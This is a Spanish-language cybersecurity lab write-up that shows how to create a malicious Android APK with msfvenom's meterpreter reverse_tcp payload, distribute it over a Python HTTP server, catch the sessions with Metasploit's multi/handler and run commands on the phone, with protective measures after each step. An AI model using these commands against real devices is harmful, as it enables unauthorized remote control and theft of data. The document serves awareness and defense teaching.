# Creación de APK Malicioso para Android y Medidas de Protección

## 📖 Introducción

Este laboratorio demuestra la creación y ejecución de una aplicación Android maliciosa en un **entorno controlado**, con el objetivo de concienciar sobre los riesgos de seguridad en dispositivos móviles y mostrar tanto técnicas ofensivas como defensivas.

**⚠️ AVISO LEGAL**: Este proyecto se realizó exclusivamente en un entorno controlado con fines educativos. El uso de estas técnicas sin autorización explícita es ilegal.

## 📑 Índice

1. [Creación del APK Malicioso](#1-creación-del-apk-malicioso)
2. [Servidor de Distribución](#2-servidor-de-distribución)
3. [Análisis de Seguridad del Dispositivo](#3-análisis-de-seguridad-del-dispositivo)
4. [Establecimiento de la Conexión](#4-establecimiento-de-la-conexión)
5. [Ejecución de Comandos Remotos](#5-ejecución-de-comandos-remotos)
6. [Medidas de Protección](#6-medidas-de-protección)

---

## 1. Creación del APK Malicioso

Para esta fase se utilizó **Msfvenom**, una potente herramienta incluida en el framework Metasploit que permite generar payloads personalizados para múltiples plataformas. Msfvenom combina las funcionalidades de msfpayload y msfencode, facilitando la creación de exploits codificados.

### Comando Ejecutado:
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP_OCULTA] LPORT=[PUERTO_OCULTO] > virus.apk
```

![Creación del APK](images/Captura-1.png)

**Características Técnicas del Payload:**
- **Plataforma**: Android (seleccionada automáticamente por el payload)
- **Arquitectura**: Dalvik (la máquina virtual de Android)
- **Tipo**: Meterpreter reverse TCP - establece conexión saliente hacia el atacante
- **Tamaño**: 10238 bytes de payload sin codificar
- **Encoder**: No se especificó encoder, salida en raw payload

**Funcionamiento del Payload:**
El payload android/meterpreter/reverse_tcp crea una aplicación Android que, al ejecutarse, establece una conexión TCP reversa hacia la IP y puerto especificados. Esta técnica evade firewalls tradicionales ya que la conexión se origina desde el dispositivo víctima.

### 🛡️ Medida de Protección #1:
- **Verificar aplicaciones**: Solo descargar apps de tiendas oficiales (Google Play Store)
- **Análisis estático**: Usar herramientas como `apktool` para descompilar y analizar APKs sospechosos
- **Firmas digitales**: Verificar que las aplicaciones estén firmadas correctamente

---

## 2. Servidor de Distribución

Se configuró un servidor HTTP simple utilizando el módulo **http.server** de Python 3. Este servidor web básico permite servir archivos a través del protocolo HTTP en el puerto 80, simulando un sitio web legítimo desde donde descargar la aplicación maliciosa.

### Comando del Servidor:
```bash
python3 -m http.server 80
```

![Servidor HTTP](images/Captura-3.png)

**Actividad del Servidor Monitorizada:**
- Servicio HTTP activo en 0.0.0.0:80 (todas las interfaces)
- Múltiples solicitudes GET desde el dispositivo objetivo (192.168.x.x)
- Petición inicial al directorio raíz "/" (código 200)
- Intento fallido de carga de favicon.ico (código 404)
- Descarga exitosa del archivo `virus.apk` (código 200)
- Timestamps específicos que muestran el momento exacto de cada petición

**Estrategia de Distribución:**
El servidor se mantuvo en espera de conexiones entrantes, registrando todas las peticiones HTTP. Cuando el usuario accedió desde su dispositivo móvil y descargó el APK, el servidor registró la transferencia completa del archivo malicioso.

### 🛡️ Medida de Protección #2:
- **Firewall de red**: Bloquear puertos innecesarios
- **HTTPS obligatorio**: Evitar descargas sobre HTTP
- **Filtrado de contenido**: Usar soluciones de seguridad web
- **Bloquear descargas de fuentes desconocidas**: Configurar el dispositivo para impedir instalaciones no verificadas

---

## 3. Análisis de Seguridad del Dispositivo

Se realizó un análisis de seguridad completo utilizando las herramientas nativas de verificación de Android. El sistema de seguridad integrado del dispositivo **NO detectó** la aplicación como maliciosa, demostrando una brecha crítica en los sistemas de protección automática.

![Análisis de Seguridad](images/Captura-4.jpg)

**Resultados Detallados del Análisis:**
- ✅ "Pasó las pruebas de seguridad" - El escáner nativo no identificó patrones maliciosos
- ✅ "No se detectaron riesgos" - Análisis superficial de permisos y comportamiento
- ✅ "No se encontraron virus" - Base de datos de firmas no reconoció el payload
- ✅ "La aplicación es legítima" - Verificación de aplicación falsificada falló
- ✅ "No se encontraron otros riesgos" - Análisis heurístico insuficiente

**Características de la Aplicación Reportadas:**
- **Nombre**: MainActivity
- **Versión**: 1.0
- **Tamaño**: 10.0 KB
- **Estado**: Aprobada para instalación

**Limitaciones Evidentes del Antivirus Nativo:**
- No detecta payloads de Meterpreter personalizados
- Análisis basado principalmente en firmas conocidas
- Escasa capacidad de detección heurística
- No analiza comportamiento en tiempo de ejecución

### 🛡️ Medida de Protección #3:
- **Antivirus de terceros**: Instalar soluciones de seguridad reconocidas
- **Análisis heurístico**: Habilitar detección basada en comportamiento
- **Actualizaciones**: Mantener el sistema y aplicaciones de seguridad actualizadas
- **Google Play Protect**: Asegurarse de que está activado y funcionando

---

## 4. Establecimiento de la Conexión

Se configuró el **multi/handler** de Metasploit, un exploit de escucha múltiple que espera conexiones entrantes de payloads. Este handler actúa como servidor que recibe las conexiones reversas establecidas por el payload ejecutado en el dispositivo víctima.

### Configuración del Handler:
```bash
use multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST [IP_OCULTA]
set LPORT [PUERTO_OCULTO]
run
```

![Configuración Metasploit](images/Captura-5.png)

**Proceso de Establecimiento de Conexión:**
- **Inicialización**: Handler iniciado en la IP y puerto especificados
- **Stage 1**: El payload inicial establece conexión y solicita el stage principal
- **Transferencia**: Envío del stage Meterpreter (72H23 bytes) al dispositivo
- **Múltiples Sesiones**: Se establecieron dos sesiones simultáneas desde diferentes puertos
- **Errores de Extensión**: Fallo en carga de extensiones STDAPI y Android (comportamiento esperado)

**Detalles Técnicos de las Sesiones:**
- **Session 1**: Conexión desde puerto 48160 del dispositivo víctima
- **Session 2**: Conexión desde puerto 4816H del dispositivo víctima  
- **Timestamp**: 2025-10-22 13:39:36 +0200 (hora exacta de compromiso)
- **Estado**: Sesiones Meterpreter completamente funcionales

**Comportamiento del Reverse TCP:**
El payload en el dispositivo Android inicia una conexión saliente hacia el handler, evitando restricciones de firewall tradicionales. Una vez establecida la conexión, se transfiere el stage de Meterpreter que proporciona capacidades avanzadas de control remoto.

### 🛡️ Medida de Protección #4:
- **Segmentación de red**: Aislar dispositivos en VLANs separadas
- **Detección de anomalías**: Monitorear conexiones salientes inusuales
- **IPS/IDS**: Implementar sistemas de prevención/detección de intrusos
- **Firewall personal**: Usar aplicaciones de firewall en el dispositivo móvil

---

## 5. Ejecución de Comandos Remotos

Una vez establecida la conexión Meterpreter, se obtuvo acceso completo al sistema Android, permitiendo la ejecución de comandos con privilegios de usuario. La sesión Meterpreter proporciona un entorno avanzado para la administración remota del dispositivo comprometido.

![Comandos Remotos](images/Captura-6.png)

**Información del Sistema Obtenida mediante `sysinfo`:**
- **Computer**: localhost (nombre del dispositivo)
- **Sistema Operativo**: Android 13 con kernel Linux 4.14.190-perf-g7da93debc0ee
- **Arquitectura**: aarch64 (ARM 64-bit)
- **Lenguaje del Sistema**: Español (es_ES)
- **Tipo de Meterpreter**: dalvik/android (especializado para Android)

**Capacidades Demostradas:**
- Ejecución arbitraria de comandos del sistema
- Acceso al sistema de archivos del usuario
- Capacidad de enumeración de procesos
- Navegación completa del sistema de archivos
- Persistencia en el directorio de datos de la aplicación

### 🛡️ Medida de Protección #5:
- **Permisos mínimos**: Restringir permisos de aplicaciones
- **Sandboxing**: Aislar ejecución de aplicaciones
- **Monitorización**: Auditar procesos y actividades del sistema
- **Root/desbloqueo**: Evitar el root del dispositivo para mantener las protecciones del sistema

---

## 6. Medidas de Protección Completas

### 🔒 Hardening de Dispositivos Android:

1. **Configuración de Seguridad:**
   - Habilitar verificación de aplicaciones
   - Desactivar fuentes desconocidas
   - Actualizar regularmente el sistema
   - Usar bloqueo de pantalla seguro

2. **Protección de Red:**
   - Usar VPN para tráfico sensible
   - Configurar firewall de dispositivo
   - Evitar redes WiFi públicas
   - Desactivar Bluetooth cuando no se use

3. **Concienciación del Usuario:**
   - Verificar permisos de aplicaciones
   - Descargar solo de tiendas oficiales
   - Revisar análisis de seguridad
   - Desconfiar de aplicaciones que piden permisos excesivos

4. **Herramientas Recomendadas:**
   - Antivirus móvil
   - Gestores de permisos
   - Aplicaciones de detección de root
   - Scanner de malware

### 🛠️ Herramientas Defensivas:

- **MobSF (Mobile Security Framework)**: Análisis estático de APKs
- **QARK**: Detección de vulnerabilidades
- **Drozer**: Testing de seguridad para Android
- **Frida**: Análisis dinámico de aplicaciones
- **APKTool**: Para descompilar y analizar aplicaciones

---

## 📊 Conclusiones

Este laboratorio demuestra que:

1. **Los antivirus nativos pueden ser evadidos** por malware especializado
2. **La ingeniería social** es crucial en la distribución de malware
3. **El bastionado proactivo** es esencial para la seguridad móvil
4. **La educación del usuario** es la primera línea de defensa
5. **La defensa en profundidad** es necesaria para proteger dispositivos móviles

## 🔗 Recursos Adicionales

- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
- [Android Security Bulletins](https://source.android.com/security/bulletin)
- [MITRE ATT&CK Mobile Matrix](https://attack.mitre.org/matrices/enterprise/mobile/)
- [Google Android Security Center](https://www.android.com/security-center/)

---

**📝 Nota**: Este laboratorio se realizó en un entorno completamente aislado y controlado con el único propósito de investigación y educación en ciberseguridad.

